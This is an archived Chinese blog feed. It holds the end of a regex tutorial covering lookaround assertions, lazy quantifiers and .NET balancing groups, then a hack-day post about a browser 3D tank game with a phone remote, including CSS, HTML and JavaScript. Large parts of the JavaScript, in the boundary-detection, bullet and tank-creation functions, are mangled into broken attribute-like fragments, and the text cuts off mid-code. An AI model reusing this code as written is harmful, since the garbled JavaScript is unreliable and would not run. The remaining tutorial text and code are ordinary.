零宽度负预测先行断言(?!exp)，断言此位置的后面不能匹配表达式exp。例如：\d{3}(?!\d)匹配三位数字，而且这三位数字的后面不能是数字；\b((?!abc)\w)+\b匹配不包含连续字符串abc的单词。同理，我们可以用(?&lt;!exp),零宽度负回顾后发断言来断言此位置的前面不能匹配表达式exp：(?&lt;![a-z])\d{7}匹配前面不是小写字母的七位数字。请详细分析表达式(?&lt;=&lt;(\w+)&gt;).(?=&lt;\/\1&gt;)，这个表达式最能表现零宽断言的真正用途。一个更复杂的例子：(?&lt;=&lt;(\w+)&gt;).(?=&lt;\/\1&gt;)匹配不包含属性的简单HTML标签内里的内容。(?&lt;=&lt;(\w+)&gt;)指定了这样的前缀：被尖括号括起来的单词(比如可能是&lt;b&gt;)，然后是.*(任意的字符串),最后是一个后缀(?=&lt;\/\1&gt;)。注意后缀里的\/，它用到了前面提过的字符转义；\1则是一个反向引用，引用的正是捕获的第一组，前面的(\w+)匹配的内容，这样如果前缀实际上是&lt;b&gt;的话，后缀就是&lt;/b&gt;了。整个表达式匹配的是&lt;b&gt;和&lt;/b&gt;之间的内容(再次提醒，不包括前缀和后缀本身)。 注释 小括号的另一种用途是通过语法(?#comment)来包含注释。例如：2[0-4]\d(?#200-249)|250-5|[01]?\d\d?(?#0-199)。要包含注释的话，最好是启用\忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。例如，我们可以前面的一个表达式写成这样： (?&lt;= # 断言要匹配的文本的前缀 &lt;(\w+)&gt; # 查找尖括号括起来的字母或数字(即HTML/XML标签) ) # 前缀结束 . # 匹配任意文本 (?= # 断言要匹配的文本的后缀 &lt;\/\1&gt; # 查找尖括号括起来的内容：前面是一个”/“，后面是先前捕获的标签 ) # 后缀结束贪婪与懒惰当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。以这个表达式为例：a.b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配。有时，我们更需要懒惰匹配，也就是匹配尽可能少的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号?。这样.?就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。现在看看懒惰版的例子吧：a.?b匹配最短的，以a开始，以b结束的字符串。如果把它应用于aabab的话，它会匹配aab（第一到第三个字符）和ab（第四到第五个字符）。为什么第一个匹配是aab（第一到第三个字符）而不是ab（第二到第三个字符）？简单地说，因为正则表达式有另一条规则，比懒惰／贪婪规则的优先级更高：最先开始的匹配拥有最高的优先权&mdash;&mdash;The match that begins earliest wins。表5.懒惰限定符代码/语法说明*?重复任意次，但尽可能少重复+?重复1次或更多次，但尽可能少重复??重复0次或1次，但尽可能少重复{n,m}?重复n到m次，但尽可能少重复{n,}?重复n次以上，但尽可能少重复处理选项在C#中，你可以使用Regex(String, RegexOptions)构造函数来设置正则表达式的处理选项。如：Regex regex = new Regex(@”\ba\w{6}\b”, RegexOptions.IgnoreCase);上面介绍了几个选项如忽略大小写，处理多行等，这些选项能用来改变处理正则表达式的方式。下面是.Net中常用的正则表达式选项：表6.常用的处理选项名称说明IgnoreCase(忽略大小写)匹配时不区分大小写。Multiline(多行模式)更改^和$的含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。(在此模式下,$的精确含意是:匹配\n之前的位置以及字符串结束前的位置.)Singleline(单行模式)更改.的含义，使它与每一个字符匹配（包括换行符\n）。IgnorePatternWhitespace(忽略空白)忽略表达式中的非转义空白并启用由#标记的注释。ExplicitCapture(显式捕获)仅捕获已被显式命名的组。一个经常被问到的问题是：是不是只能同时使用多行模式和单行模式中的一种？答案是：不是。这两个选项之间没有任何关系，除了它们的名字比较相似（以至于让人感到疑惑）以外。 平衡组/递归匹配 这里介绍的平衡组语法是由.Net Framework支持的；其它语言／库不一定支持这种功能，或者支持此功能但需要使用不同的语法。有时我们需要匹配像( 100 ( 50 + 15 ) )这样的可嵌套的层次性结构，这时简单地使用(.+)则只会匹配到最左边的左括号和最右边的右括号之间的内容(这里我们讨论的是贪婪模式，懒惰模式也有下面的问题)。假如原来的字符串里的左括号和右括号出现的次数不相等，比如( 5 / ( 3 + 2 ) ) )，那我们的匹配结果里两者的个数也不会相等。有没有办法在这样的字符串里匹配到最长的，配对的括号之间的内容呢？为了避免(和(把你的大脑彻底搞糊涂，我们还是用尖括号代替圆括号吧。现在我们的问题变成了如何把xx &lt;aa &lt;bbb&gt; &lt;bbb&gt; aa&gt; yy这样的字符串里，最长的配对的尖括号内的内容捕获出来？这里需要用到以下的语法构造：(?’group’) 把捕获的内容命名为group,并压入堆栈(Stack)(?’-group’) 从堆栈上弹出最后压入堆栈的名为group的捕获内容，如果堆栈本来为空，则本分组的匹配失败(?(group)yes|no) 如果堆栈上存在以名为group的捕获内容的话，继续匹配yes部分的表达式，否则继续匹配no部分(?!) 零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败如果你不是一个程序员（或者你自称程序员但是不知道堆栈是什么东西），你就这样理解上面的三种语法吧：第一个就是在黑板上写一个”group”，第二个就是从黑板上擦掉一个”group”，第三个就是看黑板上写的还有没有”group”，如果有就继续匹配yes部分，否则就匹配no部分。我们需要做的是每碰到了左括号，就在压入一个”Open”,每碰到一个右括号，就弹出一个，到了最后就看看堆栈是否为空－－如果不为空那就证明左括号比右括号多，那匹配就应该失败。正则表达式引擎会进行回溯(放弃最前面或最后面的一些字符)，尽量使整个表达式得到匹配。&lt; #最外层的左括号 [^&lt;&gt;] #最外层的左括号后面的不是括号的内容 ( ( (?’Open’&lt;) #碰到了左括号，在黑板上写一个”Open” [^&lt;&gt;] #匹配左括号后面的不是括号的内容 )+ ( (?’-Open’&gt;) #碰到了右括号，擦掉一个”Open” [^&lt;&gt;] #匹配右括号后面不是括号的内容 )+ ) (?(Open)(?!)) #在遇到最外层的右括号前面，判断黑板上还有没有没擦掉的”Open”；如果还有，则匹配失败&gt; #最外层的右括号平衡组的一个最常见的应用就是匹配HTML,下面这个例子可以匹配嵌套的&lt;div&gt;标签：&lt;div[^&gt;]&gt;[^&lt;&gt;](((?’Open’&lt;div[^&gt;]&gt;)[^&lt;&gt;])+((?’-Open’&lt;/div&gt;)[^&lt;&gt;])+)*(?(Open)(?!))&lt;/div&gt;. 还有些什么东西没提到 上边已经描述了构造正则表达式的大量元素，但是还有很多没有提到的东西。下面是一些未提到的元素的列表，包含语法和简单的说明。你可以在网上找到更详细的参考资料来学习它们–当你需要用到它们的时候。如果你安装了MSDN Library,你也可以在里面找到.net下正则表达式详细的文档。这里的介绍很简略，如果你需要更详细的信息，而又没有在电脑上安装MSDN Library,可以查看关于正则表达式语言元素的MSDN在线文档。表7.尚未详细讨论的语法代码/语法说明\a报警字符(打印它的效果是电脑嘀一声)\b通常是单词分界位置，但如果在字符类里使用代表退格\t制表符，Tab\r回车\v竖向制表符\f换页符\n换行符\eEscape\0nnASCII代码中八进制代码为nn的字符\xnnASCII代码中十六进制代码为nn的字符\unnnnUnicode代码中十六进制代码为nnnn的字符\cNASCII控制字符。比如\cC代表Ctrl+C\A字符串开头(类似^，但不受处理多行选项的影响)\Z字符串结尾或行尾(不受处理多行选项的影响)\z字符串结尾(类似$，但不受处理多行选项的影响)\G当前搜索的开头\p{name}Unicode中命名为name的字符类，例如\p{IsGreek}(?&gt;exp)贪婪子表达式(?&lt;x&gt;-&lt;y&gt;exp)平衡组(?im-nsx:exp)在子表达式exp中改变处理选项(?im-nsx)为表达式后面的部分改变处理选项(?(exp)yes|no)把exp当作零宽正向先行断言，如果在这个位置能匹配，使用yes作为此组的表达式；否则使用no(?(exp)yes)同上，只是使用空表达式作为no(?(name)yes|no)如果命名为name的组捕获到了内容，使用yes作为表达式；否则使用no(?(name)yes)同上，只是使用空表达式作为no布局排版：Barret Lee本文转自：http://www.jb51.net/tools/zhengze.html&nbsp;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3D遥控坦克大战]]></title>
    <url>%2Fblog%2F2013%2F06%2F03%2F2013-06-03-cb-3D-Tank-War%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 昨天参加了hack day的一个比赛，赛制大致是：24小时，自由组队2~4人，任意发挥。运气比较好，拿了第三名和最佳创意奖。建议先看看这个demo，bug是有的，chrome下玩玩，测试测试就行，O(&cap;_&cap;)O~ DEMO：http://qianduannotes.sinaapp.com/3dtank/html/index.html&nbsp;基本效果: 关于 懒得去SAE上折腾，没把那另外一半的功能补上，不过我还是介绍下这几个没补上功能吧。 1. 音效。开始音乐是比较古老的坦克大战开机音乐。 ① 开始音效 点击播放 ② 发子弹 &nbsp; &nbsp;点击播放 ③ 击中坦克&nbsp;点击播放 ④ 爆炸 &nbsp; &nbsp; &nbsp;&nbsp;点击播放 ②和③是自己录制的，呵呵，DIY的东西才好玩。 2. 登录验证 采用的是解锁，这个创意应该是非常不错的，当登录的时候，A、B玩家下方会生成一个如上图的canvas解锁块，当然这个解锁卡也会通过socket传送到手机遥控端，手机解锁成功后方可登录。 3. 坦克360&deg;旋转 由于键盘控制只能上下左右，所以360&deg;是转不出来的..刚想截一张手机控制游戏的图，总是报错…囧（后台用的是php，socket控制信号传输，刚打开手机端网页的时候php socket报错）。手机遥控端视图： 这里主要利用的是手机多点触控，touchstart,touchmove,touchend这三个事件。 12345function canvasAddListener() &#123; canvas.addEventListener(&apos;touchstart&apos;, onTouchStart, false); canvas.addEventListener(&apos;touchmove&apos;, onTouchMove, false); canvas.addEventListener(&apos;touchend&apos;, onTouchEnd, false);&#125; &nbsp; 4. 重新开始游戏和打死坦克添加效果等 以上都是没有公开显示出来的效果，下次弄好了再上传吧，嘻嘻。 先说说前台 前台主要采用的是css3和js（这是废话）。1. css3构建一个3D游戏场地效果： 123456789101112131415161718192021222324252627282930313233343536373839.box &#123; width:500px; height:500px; position:relative; -webkit-transform-style: preserve-3d; /*-webkit-transform: rotateY(40deg);*/ -webkit-transition:all 1s ease-in-out;&#125;.inBox &#123; width:300px; height:300px; overflow: hidden; text-align: center; box-shadow: 0px 0px 2px white; background:rgba(255,255,255,.2); /*background:#779443;*/ position:absolute; top:100px; left:100px; color:white;&#125;.box-forward &#123; -webkit-transform: rotateY(0deg) translateZ(150px);&#125;.box-back &#123; -webkit-transform: rotateY(180deg) translateZ(150px);&#125;.box-left &#123; -webkit-transform: rotateY(270deg) translateZ(150px);&#125;.box-right &#123; -webkit-transform: rotateY(90deg) translateZ(150px);&#125;.box-top &#123; -webkit-transform:rotateX(90deg) translateZ(150px);&#125;.box-bottom &#123; -webkit-transform:rotateX(-90deg) translateZ(150px);&#125; 上面是css部分，比赛过程中，参看了下张鑫旭大哥的文章（之前这块还不是很了解的），文章链接。就不细说了。下面是HTML部分： 12345678910&lt;div class=&quot;w&quot;&gt; &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;inBox box-forward&quot; data-num=&quot;upF rightF downF leftF&quot; data-v=&quot;1&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;inBox box-back&quot; data-num=&quot;upF leftF downF rightF&quot; data-v=&quot;2&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;inBox box-left&quot; data-num=&quot;upF forwardF downF backF&quot; data-v=&quot;3&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;inBox box-right&quot; data-num=&quot;upF backF downF forwardF&quot; data-v=&quot;4&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;inBox box-top&quot; data-num=&quot;backF rightF forwardF leftF&quot; data-v=&quot;5&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;inBox box-bottom&quot; data-num=&quot;backF leftF forwardF rightF&quot; data-v=&quot;6&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 2. JS这块，写了比较多。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429var $ = document.querySelectorAll.bind(document);/*** @description core part* @author hustskyking*/var faces = $(&quot;.inBox&quot;), bloodA = $(&quot;.bloodA div&quot;)[0], bloodB = $(&quot;.bloodB div&quot;)[0], box = $(&quot;.box&quot;)[0], upF = $(&quot;.box-top&quot;)[0], downF = $(&quot;.box-bottom&quot;)[0], leftF = $(&quot;.box-left&quot;)[0], rightF = $(&quot;.box-right&quot;)[0], forwardF = $(&quot;.box-forward&quot;)[0], backF = $(&quot;.box-back&quot;)[0], cSize = upF.clientWidth, datas = &#123; &quot;upF&quot;: upF, &quot;downF&quot;: downF, &quot;leftF&quot;: leftF, &quot;rightF&quot;: rightF, &quot;forwardF&quot;: forwardF, &quot;backF&quot;: backF &#125;, stopN = 0, tanks = &#123;&#125;, randomTank = 2, tankLimit = 20, //a w d s j ← ↑ → ↓ p debug_keySet = [[65, 87, 68, 83, 74], [37, 38, 39, 40, 80]];/*** @Class Tank* @attrs width, height, currentX, currentY, speedX, speedY, angleX, angleY, plusy, plusx* container, dataset, stopN, tank, tankId, life, bulletBox, color, timerLimit, timer, gap, sTime*/var Tank = function(setting)&#123; var opts = setting || &#123;&#125;; this.container = opts.container || forwardF; this.dataset = this.container.getAttribute(&apos;data-num&apos;).split(&quot; &quot;); this.belong = 0; this.grade = 0; this.debug = false; this.width = opts.width || 14; this.height = opts.height || 18; this.stopN = &quot;keyup&quot; + (window.stopN++); this.gap = opts.gap || 30; this.speed = opts.speed || 3; this.ax = 0; this.ay = 0; this.cx = opts.cx || (cSize - this.width) / 2; this.cy = opts.cy || (cSize - this.height) / 2; this.sx = 0; this.sy = 0; this.tank = null; this.tankId = &quot;&quot;; this.life = 100; this.color = opts.color || &quot;#0047B3&quot;; this.bulletBox = []; this.bColor = opts.bColor || &quot;#0047B3&quot;; this.timerLimit= 400; this.gunAngle = 0; this.timer = null; this.sTime = 0;&#125;Tank.prototype = &#123; init: function(tankId, debug)&#123; if(tankId)&#123; this.tankId = tankId; this.belong = (Number(tankId) &gt; 2 ? 2 :Number(tankId)); &#125;else&#123; throw new Error(&quot;必须设置tank ID&quot;); &#125; var this_ = this; //绘制坦克 this.paintTank(); if(debug)&#123; this.debug = true; this.keySet = debug.keySet; window.addEventListener(&quot;keydown&quot;, function()&#123; this_.move_debug(); &#125;, false); &#125; window.addEventListener(this.stopN, function()&#123; clearInterval(this_.timer); &#125;, false); &#125;, paintTank: function()&#123; var tank = document.createElement(&quot;span&quot;); var circle = document.createElement(&quot;span&quot;); var gun = document.createElement(&quot;span&quot;); gun.setAttribute(&quot;class&quot;, &quot;gun&quot;); tank.setAttribute(&quot;class&quot;, &quot;tank&quot;); circle.setAttribute(&quot;class&quot;, &quot;circle&quot;); tank.setAttribute(&quot;id&quot;, &quot;tank&quot; + this.tankId); gun.style.borderColor = this.color; circle.style.borderColor = this.color; tank.style.cssText = &quot;width:&quot; + this.width + &quot;px;height:&quot; + this.height + &quot;px;top:&quot; + this.cy + &quot;px;left:&quot; + this.cx + &quot;px;border-color:&quot; + this.color; tank.appendChild(gun); tank.appendChild(circle); this.container.getElementsByTagName(&quot;div&quot;)[0].appendChild(tank); this.tank = tank; return tank; &#125;, switchPainter: function(N)&#123; //N 1-&gt;up 2-&gt;right 3-&gt;down 4-&gt;down this.ay %= 360; var r = false, a = 0; if (this.ay &gt; 180) &#123; this.ay -= 360; r = true; &#125; if (this.ay &lt; -180) this.ay += 360; this.container = datas[this.dataset[N]]; this.dataset = this.container.getAttribute(&apos;data-num&apos;).split(&quot; &quot;); this.container.getElementsByTagName(&quot;div&quot;)[0].appendChild(this.tank); if(this.belong &gt;= 2) return; box.style.cssText = &quot;-webkit-transform: rotateY(&quot; + (this.ay + (r ? -a : a)) + &quot;deg);&quot;; &#125;, setAngle: function(x, y, ang)&#123; this.sx = x; this.sy = y; this.gunAngle = 90 - ang / Math.PI * 180; $(&quot;#tank&quot; + this.tankId)[0].style.cssText += &quot;-webkit-transform: rotate(&quot; + this.gunAngle + &quot;deg);&quot;; &#125;, move: function(ang)&#123; this.setAngle(Math.cos(ang), -Math.sin(ang), ang); this.stopAni(); this.ani(); &#125;, direction_debug: function()&#123; switch(event.keyCode) &#123; case this.keySet[0]: return &quot;left&quot;; case this.keySet[1]: return &quot;up&quot;; case this.keySet[2]: return &quot;right&quot;; case this.keySet[3]: return &quot;down&quot;; case this.keySet[4]: return &quot;shooter&quot;; &#125; &#125;, move_debug: function()&#123; this.stopAni(); switch(this.direction_debug()) &#123; case &quot;up&quot;: console.log(&quot;up&quot;); this.setAngle(0, -1, Math.PI / 2); this.gunAngle_debug = 0; break; case &quot;down&quot;: console.log(&quot;down&quot;); this.setAngle(0, 1, Math.PI / 2 * 3); this.gunAngle_debug = 180; break; case &quot;left&quot;: console.log(&quot;left&quot;); this.setAngle(-1, 0, Math.PI); this.gunAngle_debug = 90; break; case &quot;right&quot;: console.log(&quot;right&quot;); this.setAngle(1, 0, Math.PI * 2); this.gunAngle_debug = -90; break; case &quot;shooter&quot;: console.log(&quot;shooter&quot;); this.shooter(); default: return; &#125; this.ani(); &#125;, ani: function()&#123; var this_ = this; this.timer = setInterval(function()&#123; this_.detective(); // this_.detectiveTank(); this_.cx += this_.sx * this_.speed; this_.cy += this_.sy * this_.speed; this_.detective(); this_.tank.style.top = this_.cy + &quot;px&quot;; this_.tank.style.left = this_.cx + &quot;px&quot;; &#125;, this.gap); &#125;, stopAni: function()&#123; var event = document.createEvent(&apos;HTMLEvents&apos;); event.initEvent(this.stopN, true, true); event.eventName = this.stopN; window.dispatchEvent(event); &#125;, detective: function()&#123; if(this.cx - this.width &gt;= cSize)&#123; //right this.ay += -90; this.ax += 0; this.switchPainter(1); this.cx = 1; &#125; if(this.cx + this.width &lt;= 0)&#123;=&quot;&quot; left=&quot;&quot; this.ay=&quot;&quot; +=&quot;90;&quot; this.ax=&quot;&quot; this.switchpainter(3);=&quot;&quot; this.cx=&quot;cSize&quot; this.width=&quot;&quot; -=&quot;&quot; 1;=&quot;&quot; &#125;=&quot;&quot; if(this.cy=&quot;&quot; &lt;=&quot;0)&#123;&quot; top=&quot;&quot; this.sy=&quot;0;&quot; this.cy=&quot;4;&quot;&gt;= cSize)&#123; //bottom this.sy = 0; this.cy = cSize - this.width - 8; &#125; &#125;, detectiveTank: function()&#123; if(this.cx - this.width &gt;= cSize)&#123; //right this.ay += -90; this.ax += 0; this.switchPainter(1); this.cx = 1; &#125; if(this.cx + this.width &lt;= 0)&#123;=&quot;&quot; left=&quot;&quot; this.ay=&quot;&quot; +=&quot;90;&quot; this.ax=&quot;&quot; this.switchpainter(3);=&quot;&quot; this.cx=&quot;cSize&quot; this.width=&quot;&quot; -=&quot;&quot; 1;=&quot;&quot; &#125;=&quot;&quot; if(this.cy=&quot;&quot; &lt;=&quot;0)&#123;&quot; top=&quot;&quot; this.sy=&quot;0;&quot; this.cy=&quot;4;&quot;&gt;= cSize)&#123; //bottom this.sy = 0; this.cy = cSize - this.width - 8; &#125; &#125;, shooter: function()&#123; if((new Date()).getTime() - this.sTime &lt; this.timerLimit) return; var bullet = new Bullet(this.gunAngle, this.cx, this.cy, this.tankId); this.container.getElementsByTagName(&quot;div&quot;)[0].appendChild(bullet.bullet); bullet.move(); this.sTime = (new Date()).getTime(); &#125;, destroy: function()&#123; this.stopAni(); this.shooterTimer &amp;&amp; clearInterval(this.shooterTimer); this.moveTimer &amp;&amp; clearInterval(this.moveTimer); if(this.tankId &gt;= 2 &amp;&amp; randomTank &lt;= 180=&quot;&quot; tanklimit)=&quot;&quot; createrandomtank();=&quot;&quot; delete=&quot;&quot; tanks[this.tankid];=&quot;&quot; this.tank.parentnode=&quot;&quot; &amp;&amp;=&quot;&quot; this.tank.parentnode.removechild(this.tank);=&quot;&quot; this;=&quot;&quot; &#125;=&quot;&quot; **=&quot;&quot; *=&quot;&quot; @bullet=&quot;&quot; tank=&quot;&quot; @attrs=&quot;&quot; bullet,=&quot;&quot; timer,=&quot;&quot; gap,=&quot;&quot; x,=&quot;&quot; yadsjsw=&quot;&quot; var=&quot;&quot; bullet=&quot;function(gA,&quot; y,=&quot;&quot; tankid)&#123;=&quot;&quot; this.bullet=&quot;document.createElement(&quot;span&quot;);&quot; this.timer=&quot;null;&quot; this.gap=&quot;30;&quot; this.passed=&quot;0;&quot; a=&quot;Math.cos(gA&quot; math.pi=&quot;&quot; -=&quot;&quot; 2),=&quot;&quot; b=&quot;Math.sin(gA&quot; 2);=&quot;&quot; if(math.abs(a)=&quot;&quot;&gt; 1) a = a &gt; 0 ? Math.floor(a) : Math.ceil(a); if(Math.abs(b) &gt; 1) b = b &gt; 0 ? Math.floor(b) : Math.ceil(b); this.a = a; this.b = b; this.x = x + 6; this.y = y + 7; this.bullet.setAttribute(&quot;class&quot;, &quot;bullet&quot;); this.bullet.style.top = -10 + &quot;px&quot;; this.bullet.style.left = -10 + &quot;px&quot;; this.bullet.style.borderColor = tanks[tankId].bColor; this.tankId = tankId; this.container = $(&quot;#tank&quot; + this.tankId)[0].parentNode.parentNode; this.belong = tanks[this.tankId].belong;&#125;Bullet.prototype = &#123; bSwitchPainter: function(N)&#123; this.container = this.bullet.parentNode.parentNode; this.dataset = this.container.getAttribute(&apos;data-num&apos;).split(&quot; &quot;); this.container = datas[this.dataset[N]]; this.dataset = this.container.getAttribute(&apos;data-num&apos;).split(&quot; &quot;); this.container.getElementsByTagName(&quot;div&quot;)[0].appendChild(this.bullet); this.passed++; if(this.passed == 4)&#123; this.destroy(); &#125; &#125;, detective: function()&#123; if(this.x - 2 &gt;= cSize)&#123; //right this.bSwitchPainter(1); this.x = 1; &#125; if(this.y - 2 &gt;= cSize)&#123; //bottom this.destroy(); &#125; if(this.x + 2 &lt;= 2=&quot;&quot; 0)&#123;=&quot;&quot; left=&quot;&quot; this.bswitchpainter(3);=&quot;&quot; this.x=&quot;cSize&quot; +=&quot;&quot; 3;=&quot;&quot; &#125;=&quot;&quot; if(this.y=&quot;&quot; &lt;=&quot;0)&#123;&quot; top=&quot;&quot; this.destroy();=&quot;&quot; &#125;,=&quot;&quot; move:=&quot;&quot; function()&#123;=&quot;&quot; var=&quot;&quot; this_=&quot;this;&quot; this.timer=&quot;setInterval(function()&#123;&quot; this_.detective();=&quot;&quot; this_.x=&quot;&quot; *=&quot;&quot; 5;=&quot;&quot; this_.y=&quot;&quot; this_.checkhit();=&quot;&quot; this_.bullet.style.top=&quot;this_.y&quot; &quot;px&quot;;=&quot;&quot; this_.bullet.style.left=&quot;this_.x&quot; this.gap);=&quot;&quot; checkhit:=&quot;&quot; for=&quot;&quot; (var=&quot;&quot; i=&quot;&quot; in=&quot;&quot; tanks)=&quot;&quot; &#123;=&quot;&quot; if=&quot;&quot; (i=&quot;=&quot; this.tankid)=&quot;&quot; continue;=&quot;&quot; (tanks[i].belong=&quot;=&quot; this.belong)=&quot;&quot; tx=&quot;tanks[i].cx,&quot; ty=&quot;tanks[i].cy,&quot; bc=&quot;this.container.getAttribute(&quot;data-v&quot;),&quot; tc=&quot;tanks[i].container.getAttribute(&quot;data-v&quot;),&quot; w=&quot;14;&quot; ((bc=&quot;=&quot; tc)=&quot;&quot; &amp;&amp;=&quot;&quot; (this.x=&quot;&quot; w)=&quot;&quot;&gt; tx - w) &amp;&amp; (this.y &lt; ty + w) &amp;&amp; (this.y &gt; ty - w) ) &#123; console.log(i, tanks[i].life); this.hit(tanks[i]); this.destroy(); &#125; &#125; &#125;, hit: function(tTank)&#123; tTank.life -= 20; if(tTank.belong == 0)&#123; console.log(&quot;1掉血&quot;); bloodA.style.bottom = 300 * tTank.life / 100 + &quot;px&quot;; if(tTank.life == 0)&#123; setTimeout(function()&#123; $(&quot;.pujieL&quot;)[0].style.display = &quot;block&quot;; &#125;, 2000); &#125; &#125;else if(tTank.belong == 1)&#123; console.log(&quot;2掉血&quot;); bloodB.style.bottom = 300 * tTank.life / 100 + &quot;px&quot;; if(tTank.life == 0)&#123; setTimeout(function()&#123; $(&quot;.pujieR&quot;)[0].style.display = &quot;block&quot;; &#125;, 2000); &#125; &#125;else &#123; var add = 5; if(tanks[this.tankId].belong == 0)&#123; if(tTank.life == 0)&#123; add = 20; //window.addTankGrade(0); &#125; tanks[this.tankId].grade += add; $(&quot;#gradeA&quot;)[0].innerHTML = tanks[this.tankId].grade; &#125;else&#123; if(tTank.life == 0)&#123; add = 20; //window.addTankGrade(1); &#125; tanks[this.tankId].grade += add; $(&quot;#gradeB&quot;)[0].innerHTML = tanks[this.tankId].grade; &#125; &#125; if(tTank.life &lt;= 0)&#123;=&quot;&quot; ttank.destroy();=&quot;&quot; console.log(&quot;destroyed&quot;);=&quot;&quot; &#125;=&quot;&quot; &#125;,=&quot;&quot; destroy:=&quot;&quot; function()&#123;=&quot;&quot; clearinterval(this.timer);=&quot;&quot; if=&quot;&quot; (typeof=&quot;&quot; tanks[this.tankid]=&quot;&quot; !=&quot;undefined&quot; )=&quot;&quot; &#123;=&quot;&quot; var=&quot;&quot; tankarr=&quot;tanks[this.tankId].bulletBox;&quot; tankarr.splice(tankarr.indexof(this),1);=&quot;&quot; this.bullet.parentnode=&quot;&quot; &amp;&amp;=&quot;&quot; this.bullet.parentnode.removechild(this.bullet);=&quot;&quot; *=&quot;&quot; function=&quot;&quot; createtank(color)&#123;=&quot;&quot; tank=&quot;document.createElement(&quot;span&quot;);&quot; circle=&quot;document.createElement(&quot;span&quot;);&quot; gun=&quot;document.createElement(&quot;span&quot;);&quot; gun.setattribute(&quot;class&quot;,=&quot;&quot; &quot;gun&quot;);=&quot;&quot; tank.setattribute(&quot;class&quot;,=&quot;&quot; &quot;tank&quot;);=&quot;&quot; circle.setattribute(&quot;class&quot;,=&quot;&quot; &quot;circle&quot;);=&quot;&quot; gun.style.bordercolor=&quot;color;&quot; circle.style.bordercolor=&quot;color;&quot; tank.style.csstext=&quot;width:14px;height:18px;position:relative;border-color:&quot; +=&quot;&quot; color;=&quot;&quot; tank.appendchild(gun);=&quot;&quot; tank.appendchild(circle);=&quot;&quot; return=&quot;&quot; tank;=&quot;&quot; addtankgrade(n)&#123;=&quot;&quot; box,=&quot;&quot; color,=&quot;&quot; if(n=&quot;=&quot; 0)=&quot;&quot; box=&quot;$(&quot;#tankBoxA&quot;)[0];&quot; color=&quot;#8500FF&quot; ;=&quot;&quot; &#125;else&#123;=&quot;&quot; box.appendchild(tank);=&quot;&quot; createrandomtank(obj)=&quot;&quot; obj=&quot;obj&quot; ||=&quot;&quot; &#123;cx:=&quot;&quot; 150,=&quot;&quot; cy:=&quot;&quot; color:&quot;#ecff0b&quot;,=&quot;&quot; bcolor:&quot;#ecff0b&quot;,=&quot;&quot; speed:=&quot;&quot; 1,=&quot;&quot; container:=&quot;&quot; backf&#125;;=&quot;&quot; rtank=&quot;new&quot; tank(obj);=&quot;&quot; rtank.init(string(randomtank));=&quot;&quot; rtank.shootertimer=&quot;null;&quot; if(math.random()=&quot;&quot;&gt; 0.8)&#123; rTank.shooter(); &#125; &#125;, 200); rTank.moveTimer = null; rTank.moveTimer = setInterval(function()&#123; if(Math.random() &gt; 0.4)&#123; var ang = Math.PI * 2 * Math.random(); rTank.move.call(rTank, ang); &#125; &#125;, 1200); tanks[randomTank] = rTank; randomTank++;&#125;function run_debug()&#123; tanks[0] = new Tank(&#123;cx: 50, cy: 220, color:&quot;red&quot;, bColor:&quot;red&quot;&#125;); tanks[0].init(&apos;0&apos;, &#123; keySet:debug_keySet[0] &#125;); tanks[1] = new Tank(); tanks[1].init(&apos;1&apos;, &#123; keySet:debug_keySet[1] &#125;); createRandomTank(&#123;cx: 250, cy: 220, color:&quot;#ECFF0B&quot;, bColor:&quot;#ECFF0B&quot;, speed: 1, container: backF&#125;); createRandomTank(&#123;cx: 220, cy: 220, color:&quot;#ECFF0B&quot;, bColor:&quot;#ECFF0B&quot;, speed: 1, container: backF&#125;); createRandomTank(&#123;cx: 190, cy: 220, color:&quot;#ECFF0B&quot;, bColor:&quot;#ECFF0B&quot;, speed: 1, container: backF&#125;); createRandomTank(&#123;cx: 160, cy: 220, color:&quot;#ECFF0B&quot;, bColor:&quot;#ECFF0B&quot;, speed: 1, container: backF&#125;); createRandomTank(&#123;cx: 130, cy: 220, color:&quot;#ECFF0B&quot;, bColor:&quot;#ECFF0B&quot;, speed: 1, container: backF&#125;); createRandomTank(&#123;cx: 100, cy: 220, color:&quot;#ECFF0B&quot;, bColor:&quot;#ECFF0B&quot;, speed: 1, container: backF&#125;);&#125;/*window.onload = function()&#123; var layer = document.createElement(&quot;div&quot;); layer.setAttribute(&quot;id&quot;, &quot;layer&quot;); var 